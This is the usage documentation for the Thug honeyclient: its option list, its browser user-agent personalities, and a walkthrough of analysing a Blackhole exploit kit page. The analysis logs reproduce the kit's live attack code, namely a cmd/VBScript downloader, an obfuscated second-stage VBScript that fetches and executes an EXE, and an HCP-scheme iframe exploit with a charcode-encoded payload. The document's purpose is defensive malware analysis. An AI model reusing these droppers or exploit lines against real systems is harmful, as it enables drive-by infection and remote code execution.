.. _usage:

Usage
==========================

.. toctree::
   :maxdepth: 2


Basic usage
-----------

Let's start our Thug tour by taking a look at the options it provides.

.. code-block:: sh

    ~ $ thug -h

    Synopsis:
        Thug: Pure Python honeyclient implementation

    Usage:
        thug [ options ] url

    Options:
        -h, --help                      Display this help information
        -V, --version                   Display Thug version
        -i, --list-ua                   Display available user agents
        -u, --useragent=                Select a user agent (use option -b for values, default: winxpie60)
        -e, --events=                   Enable comma-separated specified DOM events handling
        -w, --delay=                    Set a maximum setTimeout/setInterval delay value (in milliseconds)
        -n, --logdir=                   Set the log output directory
        -o, --output=                   Log to a specified file
        -r, --referer                   Specify a referer
        -p, --proxy=                    Specify a proxy (see below for format and supported schemes)
        -m, --attachment                Set the attachment mode
        -l, --local                     Analyze a locally saved page
        -x, --local-nofetch             Analyze a locally saved page and prevent remote content fetching
        -v, --verbose                   Enable verbose mode
        -d, --debug                     Enable debug mode
        -q, --quiet                     Disable console logging
        -g, --http-debug                Enable HTTP debug mode
        -t, --threshold                 Maximum pages to fetch
        -j, --extensive                 Extensive fetch of linked pages
        -O, --connect-timeout           Set the connect timeout (in seconds, default: 10 seconds)
        -T, --timeout=                  Set the analysis timeout (in seconds, default: 600 seconds)
        -c, --broken-url                Set the broken URL mode
        -y, --vtquery                   Query VirusTotal for samples analysis
        -s, --vtsubmit                  Submit samples to VirusTotal
        -b, --vt-apikey=                VirusTotal API key to be used at runtime
        -z, --web-tracking              Enable web client tracking inspection
        -k, --no-honeyagent             Disable HoneyAgent support
        -a, --image-processing          Enable image processing analysis
        -E, --awis                      Enable AWS Alexa Web Information Service (AWIS)

        Plugins:
        -A, --adobepdf=                 Specify the Adobe Acrobat Reader version (default: 9.1.0)
        -P, --no-adobepdf               Disable Adobe Acrobat Reader plugin
        -S, --shockwave=                Specify the Shockwave Flash version (default: 10.0.64.0)
        -R, --no-shockwave              Disable Shockwave Flash plugin
        -J, --javaplugin=               Specify the JavaPlugin version (default: 1.6.0.32)
        -K, --no-javaplugin             Disable Java plugin
        -L, --silverlight               Specify SilverLight version (default: 4.0.50826.0)
        -N, --no-silverlight            Disable SilverLight plugin

        Classifiers:
        --htmlclassifier=               Specify a list of additional (comma separated) HTML classifier rule files
        --urlclassifier=                Specify a list of additional (comma separated) URL classifier rule files
        --jsclassifier=                 Specify a list of additional (comma separated) JS classifier rule files
        --vbsclassifier=                Specify a list of additional (comma separated) VBS classifier rule files
        --sampleclassifier=             Specify a list of additional (comma separated) sample classifier rule files
        --htmlfilter=                   Specify a list of additional (comma separated) HTML filter files
        --urlfilter=                    Specify a list of additional (comma separated) URL filter files
        --jsfilter=                     Specify a list of additional (comma separated) JS filter files
        --vbsfilter=                    Specify a list of additional (comma separated) VBS filter files
        --samplefilter=                 Specify a list of additional (comma separated) sample filter files

        Logging:
        -F, --file-logging              Enable file logging mode (default: disabled)
        -Z, --json-logging              Enable JSON logging mode (default: disabled)
        -G, --elasticsearch-logging     Enable ElasticSearch logging mode (default: disabled)
        -D, --mongodb-address=          Specify address and port of the MongoDB instance (format: host:port)
        -Y, --no-code-logging           Disable code logging
        -U, --no-cert-logging           Disable SSL/TLS certificate logging

    Proxy Format:
        scheme://[username:password@]host:port (supported schemes: http, socks4, socks5)


Before diving deep into details let's take a look at the available personalities

.. code-block:: sh

    $ thug --list-ua

    Synopsis:
        Thug: Pure Python honeyclient implementation

    Available User-Agents:
		winxpie60             Internet Explorer 6.0     (Windows XP)
		winxpie61             Internet Explorer 6.1     (Windows XP)
		winxpie70             Internet Explorer 7.0     (Windows XP)
		winxpie80             Internet Explorer 8.0     (Windows XP)
		winxpchrome20         Chrome 20.0.1132.47       (Windows XP)
		winxpfirefox12        Firefox 12.0              (Windows XP)
		winxpsafari5          Safari 5.1.7              (Windows XP)
		win2kie60             Internet Explorer 6.0     (Windows 2000)
		win2kie80             Internet Explorer 8.0     (Windows 2000)
		win7ie80              Internet Explorer 8.0     (Windows 7)
		win7ie90              Internet Explorer 9.0     (Windows 7)
		win7ie100             Internet Explorer 10.0    (Windows 7)
		win7chrome20          Chrome 20.0.1132.47       (Windows 7)
		win7chrome40          Chrome 40.0.2214.91       (Windows 7)
		win7chrome45          Chrome 45.0.2454.85       (Windows 7)
		win7chrome49          Chrome 49.0.2623.87       (Windows 7)
		win7firefox3          Firefox 3.6.13            (Windows 7)
		win7safari5           Safari 5.1.7              (Windows 7)
		win10ie110            Internet Explorer 11.0    (Windows 10)
		osx10chrome19         Chrome 19.0.1084.54       (MacOS X 10.7.4)
		osx10chrome80         Chrome 80.0.3987.116      (MacOS X 10.15.3)
		osx10safari5          Safari 5.1.1              (MacOS X 10.7.2)
		linuxchrome26         Chrome 26.0.1410.19       (Linux)
		linuxchrome30         Chrome 30.0.1599.15       (Linux)
		linuxchrome44         Chrome 44.0.2403.89       (Linux)
		linuxchrome54         Chrome 54.0.2840.100      (Linux)
		linuxfirefox19        Firefox 19.0              (Linux)
		linuxfirefox40        Firefox 40.0              (Linux)
		galaxy2chrome18       Chrome 18.0.1025.166      (Samsung Galaxy S II, Android 4.0.3)
		galaxy2chrome25       Chrome 25.0.1364.123      (Samsung Galaxy S II, Android 4.0.3)
		galaxy2chrome29       Chrome 29.0.1547.59       (Samsung Galaxy S II, Android 4.1.2)
		nexuschrome18         Chrome 18.0.1025.133      (Google Nexus, Android 4.0.4)
		ipadchrome33          Chrome 33.0.1750.21       (iPad, iOS 7.1)
		ipadchrome35          Chrome 35.0.1916.41       (iPad, iOS 7.1.1)
		ipadchrome37          Chrome 37.0.2062.52       (iPad, iOS 7.1.2)
		ipadchrome38          Chrome 38.0.2125.59       (iPad, iOS 8.0.2)
		ipadchrome39          Chrome 39.0.2171.45       (iPad, iOS 8.1.1)
		ipadchrome45          Chrome 45.0.2454.68       (iPad, iOS 8.4.1)
		ipadchrome46          Chrome 46.0.2490.73       (iPad, iOS 9.0.2)
		ipadchrome47          Chrome 47.0.2526.70       (iPad, iOS 9.1)
		ipadsafari7           Safari 7.0                (iPad, iOS 7.0.4)
		ipadsafari8           Safari 8.0                (iPad, iOS 8.0.2)
		ipadsafari9           Safari 9.0                (iPad, iOS 9.1)

Let's start with a first basic real-world example: a Blackhole exploit kit.  

.. code-block:: sh
 :linenos:

        ~ $ thug "http://[omitted]/main.php?page=8c6c59becaa0da07"
        [2012-07-02 19:15:20] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
        [2012-07-02 19:15:20] <applet archive="Ryp.jar" code="sIda.sIda"><param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param></applet>
        [2012-07-02 19:15:20] [Navigator URL Translation] Ryp.jar -->  http://[omitted]/Ryp.jar
        [2012-07-02 19:15:22] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:23] Saving applet Ryp.jar
        [2012-07-02 19:15:24] ActiveXObject: msxml2.xmlhttp
        [2012-07-02 19:15:24] ActiveXObject: acropdf.pdf
        [2012-07-02 19:15:24] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
        [2012-07-02 19:15:24] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
        [2012-07-02 19:15:24] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
        [2012-07-02 19:15:24] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
        [2012-07-02 19:15:24] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
        [2012-07-02 19:15:24] ActiveXObject: shockwaveflash.shockwaveflash.10
        [2012-07-02 19:15:24] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (adodb.stream)
        [2012-07-02 19:15:24] ActiveXObject: adodb.stream
        [2012-07-02 19:15:24] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (Shell.Application)
        [2012-07-02 19:15:24] ActiveXObject: shell.application
        [2012-07-02 19:15:24] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (msxml2.XMLHTTP)
        [2012-07-02 19:15:24] ActiveXObject: msxml2.xmlhttp
        [2012-07-02 19:15:24] [Microsoft XMLHTTP ActiveX] Fetching from URL http://[omitted]/w.php?f=b081d&e=2
        [2012-07-02 19:15:27] [HTTP] URL: http://[omitted]/w.php?f=b081d&e=2 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:29] [Microsoft XMLHTTP ActiveX] Saving File: d328b5a123bce1c0d20d763ad745303a
        [2012-07-02 19:15:29] [Microsoft XMLHTTP ActiveX] send
        [2012-07-02 19:15:29] [Adodb.Stream ActiveX] open
        [2012-07-02 19:15:29] [Adodb.Stream ActiveX] Write
        [2012-07-02 19:15:29] [Adodb.Stream ActiveX] SaveToFile (.//..//a2ffcd1.exe)
        [2012-07-02 19:15:29] [Adodb.Stream ActiveX] Close
        [2012-07-02 19:15:29] [Shell.Application ActiveX] ShellExecute command: .//..//a2ffcd1.exe
        [2012-07-02 19:15:29] [Navigator URL Translation] ./data/ap1.php?f=b081d -->  http://[omitted]/data/ap1.php?f=b081d
        [2012-07-02 19:15:36] [HTTP] URL: http://[omitted]/data/ap1.php?f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:36] Microsoft Internet Explorer HCP Scheme Detected
        [2012-07-02 19:15:36] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
        [2012-07-02 19:15:36] [AST]: Eval argument length > 64
        [2012-07-02 19:15:36] [Windows Script Host Run] Command: 
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe

        [2012-07-02 19:15:36] [Windows Script Host Run - Stage 1] Code:
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe
        [2012-07-02 19:15:36] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&d=0
        [2012-07-02 19:15:37] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:37] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
        [2012-07-02 19:15:37] [Windows Script Host Run - Stage 2] Code:
        w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f & "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") & "am")  
        Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
        On Error resume next
        c.open OT, a, z:c.send()  
        If c.Status = x Then  
        d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close  
        End If  
        Set w=CreateObject(StrReverse("llehS." & "tpi"&"rcSW"))
        Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
        W.eXeC "taskkill /F /IM wm" & "player.e" & "xe":W.eXeC "taskkill /F /IM realplay.ex" & "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) & "\" & StrReverse("bv.l") & "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")

        [2012-07-02 19:15:37] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&f=b081d
        [2012-07-02 19:15:43] [HTTP] URL: http://[omitted]/w.php?e=5&f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:45] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
        [2012-07-02 19:15:45] <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"><param name="movie" value="data/field.swf"></param><param name="allowScriptAccess" value="always"></param><param name="Play" value="0"></param><embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed></object>
        [2012-07-02 19:15:45] <param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param>
        [2012-07-02 19:15:45] <param name="movie" value="data/field.swf"></param>
        [2012-07-02 19:15:45] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:15:52] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:52] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
        [2012-07-02 19:15:52] <param name="allowScriptAccess" value="always"></param>
        [2012-07-02 19:15:52] <param name="Play" value="0"></param>
        [2012-07-02 19:15:52] <embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed>
        [2012-07-02 19:15:52] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:15:53] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:53] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
        [2012-07-02 19:15:53] Saving log analysis at /tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511

Let's take a look at the directory which contains the logs for this session

.. code-block:: sh

        ~ $ cd /tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511
        /tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511 $ ls -lhR
        .:
        total 232K
        -rw-r--r-- 1 buffer buffer 1008 Jul  2 19:15 502da89357ca5d7c85dc7a67f8977b21
        -rw-r--r-- 1 buffer buffer  81K Jul  2 19:15 analysis.xml
        drwxr-xr-x 6 buffer buffer  176 Jul  2 19:15 application
        -rwxr-xr-x 1 buffer buffer  89K Jul  2 19:15 d328b5a123bce1c0d20d763ad745303a
        -rw-r--r-- 1 buffer buffer  51K Jul  2 19:15 Ryp.jar
        drwxr-xr-x 3 buffer buffer   72 Jul  2 19:15 text

        ./application:
        total 0
        drwxr-xr-x 2 buffer buffer 96 Jul  2 19:15 java-archive
        drwxr-xr-x 2 buffer buffer 96 Jul  2 19:15 pdf
        drwxr-xr-x 2 buffer buffer 96 Jul  2 19:15 x-msdownload
        drwxr-xr-x 2 buffer buffer 96 Jul  2 19:15 x-shockwave-flash

        ./application/java-archive:
        total 52K
        -rw-r--r-- 1 buffer buffer 51K Jul  2 19:15 e3639fde6ddf7fd0182fff9757143ff2

        ./application/pdf:
        total 16K
        -rw-r--r-- 1 buffer buffer 15K Jul  2 19:15 3660fe0e4acd23ac13f3d043eebd2bbc

        ./application/x-msdownload:
        total 92K
        -rw-r--r-- 1 buffer buffer 89K Jul  2 19:15 d328b5a123bce1c0d20d763ad745303a

        ./application/x-shockwave-flash:
        total 4.0K
        -rw-r--r-- 1 buffer buffer 1008 Jul  2 19:15 502da89357ca5d7c85dc7a67f8977b21

        ./text:
        total 0
        drwxr-xr-x 2 buffer buffer 144 Jul  2 19:15 html

        ./text/html:
        total 72K
        -rw-r--r-- 1 buffer buffer 68K Jul  2 19:15 95ee609e6e3b69c2d9e68f34ff4a4335
        -rw-r--r-- 1 buffer buffer 878 Jul  2 19:15 d26b9b1a1f667004945d1d000cf4f19e
 

If the MAEC 1.1 logging mode is enabled, the file *analysis.xml* contains the URL analysis
results saved in MAEC 1.1 format (please refer to http://maec.mitre.org for additional details).
MAEC 1.1 logging is no longer supported from Thug 0.9.44 onwards.

Please notice that all the files downloaded during the URL analysis are saved in this directory
based on their Content-Type for convenience (if the File logging mode is enabled).

Moreover if MongoDB is installed the information you can see in this directory are saved in the 
database instance too. Let's take a deeper look using pymongo (you can get the same result by
using the MongoDB client *mongo*).

.. code-block:: sh

        ~/thug/src $ python
        Python 2.7.3 (default, Jun 12 2012, 10:22:50) 
        [GCC 4.5.3] on linux2
        Type "help", "copyright", "credits" or "license" for more information.
        >>> import pymongo
        >>> connection = pymongo.Connection()
        >>> db = connection.thug
        >>> url = db.urls.find_one({'url' : 'http://[omitted]/main.php?page=8c6c59becaa0da07'})
        >>> url
        {u'url': u'http://[omitted]/main.php?page=8c6c59becaa0da07', u'_id': ObjectId('4ff1b8efe732795951000000')}
        >>> for sample in db.samples.find({'url_id': url['_id']}):
        ...     print sample
        ... 
        
        {u'_id': ObjectId('4ff1b8f4e732795951000001'), u'url': u'http://[omitted]/Ryp.jar', u'type': u'JAR', u'sha1': u'5fffd5cc4a372a6c2a826a850a955cb6a4042272', u'url_id': ObjectId('4ff1b8efe732795951000000'), u'data': u'[skipped]', u'md5': u'e3639fde6ddf7fd0182fff9757143ff2'}
        {u'_id': ObjectId('4ff1b8f7e732795951000002'), u'url': u'http://[omitted]/w.php?f=b081d&e=2', u'type': u'PE', u'sha1': u'1445e7d338d0d7c20f1d2329f4d653cce1562cc8', u'url_id': ObjectId('4ff1b8efe732795951000000'), u'data':  u'[skipped]', u'md5': u'd328b5a123bce1c0d20d763ad745303a'}
        [..]
        >>> for event in db.events.find({'url_id': url['_id']}):
        ...     print event
        ... 
        {u'MAEC': u'<MAEC_Bundle xmlns:ns1="http://xml/metadataSharing.xsd" xmlns="http://maec.mitre.org/XMLSchema/maec-core-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd" id="maec:thug:bnd:1" schema_version="1.100000">
        [..]        

Browser personality
-------------------

If no additional option (other than the URL) is provided the emulated browser personality is 
Internet Explorer 6.0 on Windows XP platform. This choice is usually quite interesting for
the really simple reason a lot of exploit kits out there try to exploit a vulnerability in Microsoft 
Data Access Components (MDAC) which allows remote code execution if facing such personality.
Thug emulates perfectly this exploit thus allowing to quite easily download a malicious 
executable for later analysis. 

If there's the need to test the content that would be served while using a different browser 
personality the *-u (--useragent)* option should be used. In the following example, the
option *-u winxpie80* is used in order to test the content served when surfing the same 
page with Internet Explorer 8.0 on Windows XP platform.


.. code-block:: sh

        ~ $ thug -u winxpie80 "http://[omitted]/main.php?page=8c6c59becaa0da07"
        [2012-07-02 19:21:00] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
        [2012-07-02 19:21:00] <applet archive="Ryp.jar" code="sIda.sIda"><param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param></applet>
        [2012-07-02 19:21:00] [Navigator URL Translation] Ryp.jar -->  http://[omitted]/Ryp.jar
        [2012-07-02 19:21:02] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:21:03] Saving applet Ryp.jar
        [2012-07-02 19:21:03] ActiveXObject: msxml2.xmlhttp
        [2012-07-02 19:21:03] ActiveXObject: acropdf.pdf
        [2012-07-02 19:21:03] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
        [2012-07-02 19:21:03] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
        [2012-07-02 19:21:03] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
        [2012-07-02 19:21:03] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
        [2012-07-02 19:21:03] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
        [2012-07-02 19:21:03] ActiveXObject: shockwaveflash.shockwaveflash.10
        [2012-07-02 19:21:03] [Navigator URL Translation] ./data/ap1.php?f=b081d -->  http://[omitted]/data/ap1.php?f=b081d
        [2012-07-02 19:21:05] [HTTP] URL: http://[omitted]/data/ap1.php?f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:21:05] Microsoft Internet Explorer HCP Scheme Detected
        [2012-07-02 19:21:05] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
        [2012-07-02 19:21:05] [AST]: Eval argument length > 64
        [2012-07-02 19:21:05] [Windows Script Host Run] Command: 
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe

        [2012-07-02 19:21:05] [Windows Script Host Run - Stage 1] Code:
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe
        [2012-07-02 19:21:05] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&d=0
        [2012-07-02 19:21:06] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:21:06] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
        [2012-07-02 19:21:06] [Windows Script Host Run - Stage 2] Code:
        w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f & "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") & "am")  
        Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
        On Error resume next
        c.open OT, a, z:c.send()  
        If c.Status = x Then  
        d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close  
        End If  
        Set w=CreateObject(StrReverse("llehS." & "tpi"&"rcSW"))
        Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
        W.eXeC "taskkill /F /IM wm" & "player.e" & "xe":W.eXeC "taskkill /F /IM realplay.ex" & "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) & "\" & StrReverse("bv.l") & "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")

        [2012-07-02 19:21:06] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&f=b081d
        [2012-07-02 19:21:09] [HTTP] URL: http://[omitted]/w.php?e=5&f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:21:11] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
        [2012-07-02 19:21:11] <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"><param name="movie" value="data/field.swf"></param><param name="allowScriptAccess" value="always"></param><param name="Play" value="0"></param><embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed></object>
        [2012-07-02 19:21:11] <param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param>
        [2012-07-02 19:21:11] <iframe height="0" src="hcp://services/search?query=anything&amp;topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=&lt;script defer&gt;eval(Run(String.fromCharCode(99,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,103,104,97,110,97,114,112,111,119,101,114,46,110,101,116,47,100,97,116,97,47,104,99,112,95,118,98,115,46,112,104,112,63,102,61,98,48,56,49,100,38,100,61,48,34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101)));&lt;/script&gt;" width="0"></iframe>
        [2012-07-02 19:21:11] [iframe redirection] http://[omitted]/main.php?page=8c6c59becaa0da07 -> hcp://services/search?query=anything&topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=<script defer>eval(Run(String.fromCharCode(99,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,103,104,97,110,97,114,112,111,119,101,114,46,110,101,116,47,100,97,116,97,47,104,99,112,95,118,98,115,46,112,104,112,63,102,61,98,48,56,49,100,38,100,61,48,34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,